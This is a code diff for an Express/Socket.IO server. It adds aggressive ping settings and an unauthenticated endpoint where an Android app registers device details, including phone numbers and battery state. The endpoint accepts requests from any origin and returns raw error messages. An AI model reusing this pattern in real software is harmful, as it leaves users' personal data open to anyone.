@@ -26,13 +26,15 @@ async function startServer() {
   const app = express();
   const server = http.createServer(app);
 
-  // Socket.IO with CORS
+  // Socket.IO with CORS + aggressive ping for instant device detection
   const io = new Server(server, {
     cors: {
       origin: '*',
       methods: ['GET', 'POST', 'PUT', 'DELETE'],
     },
     maxHttpBufferSize: 100 * 1024 * 1024, // 100MB for chunk uploads
+    pingInterval: 1000,  // ping every 1 second
+    pingTimeout: 2000,   // mark dead after 2 seconds no response
   });
 
   // Middleware
@@ -73,6 +75,39 @@ async function startServer() {
       uptime: process.uptime(),
       timestamp: new Date().toISOString(),
     });
+  });
+
+  // Device registration endpoint (called by Android app on first launch)
+  app.post('/api/devices/register', (req, res) => {
+    try {
+      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+
+      const phonesJson = JSON.stringify(phone_numbers || []);
+      const existing = db.prepare('SELECT device_id FROM devices WHERE device_id = ?').get(device_id);
+      if (existing) {
+        db.prepare(`UPDATE devices SET
+          device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
+          app_version = ?, screen_resolution = ?, phone_numbers = ?,
+          battery_percent = ?, battery_charging = ?,
+          last_seen = datetime('now')
+          WHERE device_id = ?`).run(
+          device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
+          app_version || '', screen_resolution || '', phonesJson,
+          battery_percent ?? -1, battery_charging ? 1 : 0, device_id
+        );
+      } else {
+        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging)
+          VALUES (?,?,?,?,?,?,?,?,?,?,?)`).run(
+          device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
+          app_version || '', screen_resolution || '', phonesJson,
+          battery_percent ?? -1, battery_charging ? 1 : 0
+        );
+      }
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
   });
 
   // Stream endpoint — redirects to Cloudinary URL
